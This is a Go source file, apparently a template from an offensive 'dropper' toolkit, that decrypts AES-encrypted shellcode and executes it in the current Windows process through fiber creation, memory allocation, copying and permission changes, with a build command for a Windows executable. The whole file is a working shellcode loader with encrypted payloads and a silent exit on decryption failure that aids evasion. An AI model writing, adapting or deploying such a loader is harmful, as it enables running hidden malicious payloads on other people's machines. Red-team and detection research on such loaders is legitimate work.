//go:build windows
// +build windows

/*
This program executes shellcode in the current process using the following steps
	1. Convert the main thread into a fiber with the ConvertThreadToFiber function
	2. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
	3. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
	4. Change the memory page permissions to Execute/Read with VirtualProtect
	5. Call CreateFiber on shellcode address
	6. Call SwitchToFiber to start the fiber and execute the shellcode

NOTE: Currently this program will NOT exit even after the shellcode has been executed. You must force terminate this process

This program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.
Reference: https://ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber
*/

package main

//import "C"

import (
	"fmt"
	"log"
	"os"
	"time"
	"unsafe"

	"github.com/Epictetus24/godropit/pkg/box"

	// Sub Repositories

	"golang.org/x/sys/windows"
)

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READ = 0x20
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
)

//init

func main() {
	DoStuff()
}

//export DoStuff
func DoStuff() {

	bufstring := "{{.Bufstr}}"
	kstring := "{{.Key}}"

	shellcode, err := box.AESDecrypt(kstring, bufstring)
	if err != nil {
		time.Sleep(10 * time.Second)
		os.Exit(0)
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
	CreateFiber := kernel32.NewProc("CreateFiber")
	SwitchToFiber := kernel32.NewProc("SwitchToFiber")

	fiberAddr, _, errConvertFiber := ConvertThreadToFiber.Call()

	if errConvertFiber != nil && errConvertFiber.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ConvertThreadToFiber:\r\n%s", errConvertFiber.Error()))
	}

	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAlloc failed and returned 0")
	}

	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
	}

	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
	}

	fiber, _, errCreateFiber := CreateFiber.Call(0, addr, 0)

	if errCreateFiber != nil && errCreateFiber.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateFiber:\r\n%s", errCreateFiber.Error()))
	}

	_, _, errSwitchToFiber := SwitchToFiber.Call(fiber)

	if errSwitchToFiber != nil && errSwitchToFiber.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling SwitchToFiber:\r\n%s", errSwitchToFiber.Error()))
	}

	_, _, errSwitchToFiber2 := SwitchToFiber.Call(fiberAddr)

	if errSwitchToFiber2 != nil && errSwitchToFiber2.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling SwitchToFiber:\r\n%s", errSwitchToFiber2.Error()))
	}
}

// export GOOS=windows GOARCH=amd64;go build -o goCreateFiberNative.exe cmd/CreateFiber/main.go
